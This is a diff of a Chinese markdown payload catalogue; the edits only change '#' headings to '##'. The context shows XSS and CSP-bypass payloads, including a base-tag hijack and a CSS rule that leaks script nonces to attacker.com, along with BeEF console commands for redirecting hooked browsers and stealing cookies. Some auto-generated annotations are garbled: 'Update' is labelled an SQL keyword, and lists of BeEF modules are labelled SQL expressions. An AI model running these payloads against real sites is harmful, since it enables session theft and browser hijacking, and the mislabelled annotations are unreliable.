@@ -2,7 +2,7 @@
 
 _12 条 web payload_
 
-### 反射型XSS  `xss-reflected`
+## 反射型XSS  `xss-reflected`
 _反射型跨站脚本攻击技术_
 子类：**反射型** · tags: `xss` `reflected` `javascript`
 
@@ -550,16 +550,16 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
 ` — 注入代码 _value_
 - `<base href="http://attacker.com/">` — HTML标签/事件处理器 _tag_
 - `
-# 页面中相对路径的脚本将从attacker.com加载
+## 页面中相对路径的脚本将从attacker.com加载
 
-# nonce泄露利用:
-# 通过CSS注入窃取nonce:
+## nonce泄露利用:
+## 通过CSS注入窃取nonce:
 ` — 注入代码 _value_
 - `<style>` — HTML标签/事件处理器 _tag_
 - `script[nonce^="a"]{background:url(http://attacker.com/?n=a)}` — 注入代码 _value_
 - `</style>` — HTML标签/事件处理器 _tag_
 - `
-# 或通过DOM读取: document.querySelector("script[nonce]").nonce` — 注入代码 _value_
+## 或通过DOM读取: document.querySelector("script[nonce]").nonce` — 注入代码 _value_
 
 
 **概述：** CSP(Content Security Policy)是浏览器端的XSS防御机制，通过限制脚本来源阻止恶意代码执行。CSP绕过技术利用策略配置缺陷或可信域名上的gadget来突破限制。
@@ -1389,10 +1389,10 @@ beef> run browser redirect https://evil.com
 ```
 **语法解析：**
 - `# BeEF控制台常用命令
-# 查看在线僵尸
+## 查看在线僵尸
 beef> online_browsers
 
-# 执行命令
+## 执行命令
 beef> run social_engin` — 攻击载荷 _value_
 
 **4. 模块利用**
@@ -1416,19 +1416,19 @@ beef> run social_engin` — 攻击载荷 _value_
 ```
 **语法解析：**
 - `# 常用模块
-# 社会工程学
+## 社会工程学
 - Fake Notification
 - Fake Flash ` — SQL表达式 _value_
 - `Update` — SQL关键字 _keyword_
 - `
 - Pretty Theft
 
-# 浏览器攻击
+## 浏览器攻击
 - Get Cookie
 - Redirect Browser
 - TabNabbing
 
-# 网络攻击
+## 网络攻击
 - DNS Spoofing
 - Ping Sweep
 - Port Scanner` — SQL表达式 _value_
